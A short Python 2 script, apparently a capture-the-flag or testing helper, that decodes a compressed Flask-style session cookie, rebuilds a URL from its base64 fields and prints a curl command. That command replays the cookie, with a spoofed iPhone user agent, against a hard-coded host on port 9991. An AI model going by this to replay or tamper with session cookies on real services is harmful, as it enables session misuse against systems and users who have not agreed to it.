import zlib,base64
import json
import sys

arg = str(sys.argv[1]).split(".")
hasil = zlib.decompress(base64.urlsafe_b64decode(arg[1]+"=="))
decodehasil = json.loads(hasil)
paramnya = base64.urlsafe_b64decode(str(decodehasil['scheme'][' b']))+"://"+base64.urlsafe_b64decode(str(decodehasil['netloc'][' b']))+base64.urlsafe_b64decode(str(decodehasil['path'][' b']))+"?"+base64.urlsafe_b64decode(str(decodehasil['query'][' b']))+"%23"+base64.urlsafe_b64decode(str(decodehasil['fragment'][' b']))
print('curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" "http://lc.flu.cc:9991/terserah?z='+paramnya+'" --cookie "'+str(sys.argv[1])+'" -v')
